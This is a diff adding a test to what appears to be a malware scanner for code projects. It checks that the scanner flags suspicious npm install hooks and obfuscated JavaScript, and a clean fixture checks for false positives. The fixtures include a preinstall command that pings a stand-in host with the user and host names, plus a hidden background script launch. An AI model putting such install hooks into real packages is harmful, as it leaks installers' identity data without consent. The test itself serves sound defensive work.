@@ -423,6 +423,24 @@ test("compressed payloads are inflated (with a size cap) and scanned", async () 
   assert.ok(performance.now() - t0 < 10000);
 });
 
+test("install hooks that report identity, hidden starts, obfuscated code", async () => {
+  const pkg = scripts => JSON.stringify({ name: "acme-web", version: "3.5.0", scripts });
+  const hexy = Array.from({ length: 80 }, (_, i) => `a[b<-0x${(i + 16).toString(16)}?b-0x${i.toString(16)}:b+0x2]`).join(";");
+  const decoder = "var d=function(i){return t[i-0x0]};" + Array.from({ length: 50 }, (_, i) => `x[d(0x${i.toString(16)})]`).join(";");
+  const cases = {
+    "install-hook-exfil": { "package.json": pkg({ preinstall: "ping -c 1 $USER$HOSTNAME.lp.x.example" }) },
+    "install-background": { "package.json": pkg({ preinstall: "start /B node compile.js & node compile.js" }), "compile.js": "1\n" },
+    "install-runs-obfuscated-code": { "package.json": pkg({ postinstall: "node config.js" }), "config.js": hexy },
+    "mal-obfuscated-js": { "index.js": decoder },
+  };
+  for (const [id, files] of Object.entries(cases)) assert.ok(rules(await run(project(files), { noIgnore: true })).has(id), id);
+  const clean = await run(project({
+    "package.json": pkg({ postinstall: "node scripts/check.js" }), "scripts/check.js": "console.log(process.platform)\n",
+    "sha.js": "const K = [" + Array.from({ length: 64 }, (_, i) => `0x${(0x428a2f98 + i).toString(16)}`).join(", ") + "];\nmodule.exports = K;\n",
+  }), { noIgnore: true });
+  assert.deepEqual(clean.findings.filter(f => ["install-hook-exfil", "install-background", "install-runs-obfuscated-code", "mal-obfuscated-js"].includes(f.rule)).map(f => f.rule), []);
+});
+
 test("CLI prints a report and --fail-on sets the exit code", () => {
   const dir = project({ "a.js": j("eval(at", "ob(x));\n") });
   const cli = path.resolve("skills/vetcode/scripts/vet.mjs");
